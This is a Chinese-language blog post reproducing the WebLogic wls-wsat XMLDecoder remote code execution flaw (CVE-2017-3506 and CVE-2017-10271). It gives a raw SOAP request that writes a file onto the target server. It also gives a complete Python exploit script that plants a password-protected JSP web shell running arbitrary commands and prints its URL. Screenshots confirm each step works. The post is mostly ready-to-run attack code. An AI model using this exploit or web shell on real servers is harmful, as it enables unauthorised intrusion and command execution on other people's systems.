---
title: "WebLogic RCE 复现"
date: 2018-02-06T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['rce']
categories: ['CMS']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


WebLogic Server 组件的 WLS Security 子组件存在安全漏洞, 可造成任意代码执行.

<!--more-->

poc

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.2.100:7001
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: text/xml
Content-Length: 582

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <java version="1.6.0" class="java.beans.XMLDecoder">
                    <object class="java.io.PrintWriter"> 
                        <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/vuln.jsp</string><void method="println">
                        <string>weblogic</string></void><void method="close"/>
                    </object>
                </java>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

发送代码

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/02/1517560533.jpg)

访问 /bea_wls_internal/vuln.jsp

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/02/1517560609.jpg)

本地查看

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/02/1517560621.jpg)

已经生成成功

**exp**

```
import requests
import sys

def exploit(url,filename):
    content = '<% if("weblogic".equals(request.getParameter("pass"))){java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b));}out.print("</pre>");}%>'
    payload = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.6.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/'+filename+'</string><void method="println"><string><![CDATA['+content+']]></string></void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','Upgrade-Insecure-Requests':'1','Content-Type':'text/xml'}
    response = requests.post(url+'/wls-wsat/CoordinatorPortType',data=payload,headers=headers)
    if response.status_code == 500:
        print 'Shell:',url + '/bea_wls_internal/' + filename + '?pass=weblogic&cmd=whoami'
    else:
        print 'Fail'

if __name__ == '__main__':
    print '[*] WebLogic wls-wsat RCE Exp'
    print '[*] CVE-2017-3506 & CVE-2017-10271'
    print
    if len(sys.argv) == 3:
        exploit(sys.argv[1],sys.argv[2])
    else:
        print 'Usage: WebLogic_Exp.py url shell.jsp'
```

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/02/1517560673.jpg)

backdoor.jsp

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/02/1517560689.jpg)